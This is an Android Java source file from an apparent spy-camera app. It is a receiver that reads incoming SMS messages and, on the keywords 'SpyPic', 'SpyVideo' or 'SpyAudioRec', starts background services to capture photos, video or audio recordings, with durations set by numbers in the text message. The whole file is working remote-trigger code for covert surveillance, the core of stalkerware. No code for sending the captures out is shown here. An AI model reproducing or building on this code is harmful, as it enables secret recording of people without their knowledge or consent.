package com.byteshaft.wrecspycam;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    private String msg_from;
    private String msgBody;
    private int firstValue;
    private String LOG_TAG = "SPY_CAM";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        msgBody = msgs[i].getMessageBody();
                        String intValue = msgBody.replaceAll("[^0-9]", "");
                        Log.i(LOG_TAG , String.format("requested images %s" , intValue));
                        String originalMsg = msgBody.replaceAll("[0-9]","");
                        Log.i("SPY_CAM" , "Msg :" + originalMsg);
                        switch (originalMsg) {
                            case "SpyPic":
                                Log.i("SPY_CAM", "Capturing Image");
                                Intent picServiceIntent = new Intent(context, SpyPictureService.class);
                                if (!intValue.isEmpty()) {
                                    firstValue = Character.getNumericValue(intValue.charAt(0));
                                }
                                if (firstValue != 0 && firstValue < 5) {
                                    Log.i("SPY_CAM", "FirstValue :" + firstValue);
                                    picServiceIntent.putExtra("burstValue", firstValue);
                                }
                                context.startService(picServiceIntent);
                                break;
                            case "SpyVideo":
                                Log.i("SPY_CAM", "Capturing Video");
                                Intent videoIntent = new Intent(context, SpyVideoService.class);
                                if (!intValue.isEmpty()) {
                                    int videoDelay = Integer.parseInt(intValue);
                                    Log.i("SPY_CAM", "videoDuration" + videoDelay);
                                    if (videoDelay <= 60) {
                                        videoIntent.putExtra("video_delay", videoDelay);
                                    }
                                }
                                context.startService(videoIntent);
                                break;
                            case "SpyAudioRec":
                                Log.i("SPY_CAM", "SPY_AUDIO_REC");
                                Intent audioIntent = new Intent(context, SpyVoiceRecordingService.class);
                                if (!intValue.isEmpty()) {
                                    int voiceRecDelay = Integer.parseInt(intValue);
                                    Log.i("SPY_CAM", "Audio_Duration" + voiceRecDelay);
                                    if (voiceRecDelay <= 60) {
                                        audioIntent.putExtra("Audio_Delay", voiceRecDelay);
                                    }
                                }
                                context.startService(audioIntent);
                                break;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
